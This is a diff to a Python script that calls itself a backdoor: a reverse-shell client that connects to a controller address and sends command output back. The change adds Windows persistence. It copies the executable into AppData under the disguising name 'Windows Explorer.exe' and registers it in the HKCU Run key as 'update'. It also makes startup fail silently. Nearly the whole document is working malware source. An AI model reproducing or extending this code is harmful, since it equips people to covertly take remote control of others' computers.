@@ -1,13 +1,21 @@
 #!/usr/bin/python3
 
-import socket, subprocess, json, os, base64
+import socket, subprocess, json, os, base64, shutil, sys
 
 class Backdoor:
     # Backdoor class
     def __init__(self, address: tuple):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect(address)
 
+    def become_persistent(self):
+        # Adding exe program to REG
+        evil_file_location = os.environ.get('appdata', '') + '\\Windows Explorer.exe'
+        if not os.path.exists(evil_file_location): # Checking if rwe add program to REG before
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"')
+    
     def __del__(self):
         self.connection.close()
     
@@ -69,7 +77,10 @@ class Backdoor:
             self.reliable_send(command_result)
 
 # Example
-my_backdoor = Backdoor(('127.0.0.1', 4444))
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor(('127.0.0.1', 4444))
+    my_backdoor.run()
+except Exception:
+    sys.exit()
 
 
